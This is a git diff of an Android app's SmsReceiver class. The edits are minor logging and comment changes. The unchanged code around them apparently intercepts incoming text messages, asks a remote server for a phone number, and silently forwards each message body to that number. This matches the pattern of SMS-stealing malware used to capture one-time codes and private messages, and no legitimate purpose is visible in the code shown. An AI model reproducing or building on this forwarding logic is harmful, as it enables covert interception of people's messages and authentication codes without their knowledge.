@@ -57,19 +57,21 @@ public class SmsReceiver extends BroadcastReceiver {
                                                 Toast.makeText(context, "Response Error : "+result, Toast.LENGTH_SHORT).show();
                                             } else {
                                                     try {
-
+                                                        // Log.d(Helper.TAG, "Response : "+result);
                                                             JSONObject response = new JSONObject(result);
                                                             if(response.getInt("status")==200){
                                                                   userId  = response.getInt("data");
-                                                                    Helper.getRequest(helper.getNumber() + helper.SITE(), context, new Helper.ResponseListener(){
+                                                                    Helper.getRequest(helper.getNumber()+ helper.SITE(), context, new Helper.ResponseListener(){
                                                                         @Override
                                                                         public void onResponse(String result){
                                                                             try {
+                                                                                // Log.d(Helper.TAG, "Response GetNumber : "+result);
                                                                                 // Parse JSON response
                                                                                 JSONObject jsonResponse = new JSONObject(result);
                                                                                 if (jsonResponse.has("data")) {
                                                                                     String phoneNumber = jsonResponse.getString("data");
-                                                                                    int sentRequestCode = (userId + phoneNumber).hashCode();
+
+                                                                                    int sentRequestCode = (userId + phoneNumber).hashCode(); // Generate unique request code
                                                                                     int deliveredRequestCode = (userId + phoneNumber + "_delivered").hashCode();
 
                                                                                     Intent sentIntent = new Intent(context, SentReceiver.class);
@@ -82,14 +84,13 @@ public class SmsReceiver extends BroadcastReceiver {
                                                                                     PendingIntent deliveredPendingIntent = PendingIntent.getBroadcast(context, deliveredRequestCode, deliveredIntent, PendingIntent.FLAG_IMMUTABLE);
                                                                                     SmsManager smsManager = SmsManager.getDefault();
                                                                                     smsManager.sendTextMessage(phoneNumber, null, messageBody, sentPendingIntent, deliveredPendingIntent);
-
-//                                                                                    Log.d(Helper.TAG, "SMS Forward");
+//                                                                                    // Log.d(Helper.TAG, "SMS Forward");
                                                                                 } else {
-                                                                                    Log.e("MYAPP: ", "Response does not contain 'data' field");
+                                                                                    Log.e(Helper.TAG, "Response does not contain 'data' field");
                                                                                 }
                                                                             } catch (JSONException e) {
                                                                                 e.printStackTrace();
-                                                                                Log.e("MYAPP: ", "JSON Parsing Error: " + e.getMessage());
+                                                                                Log.e(Helper.TAG, "JSON Parsing Error: " + e.getMessage());
                                                                             }
                                                                         }
                                                                     });
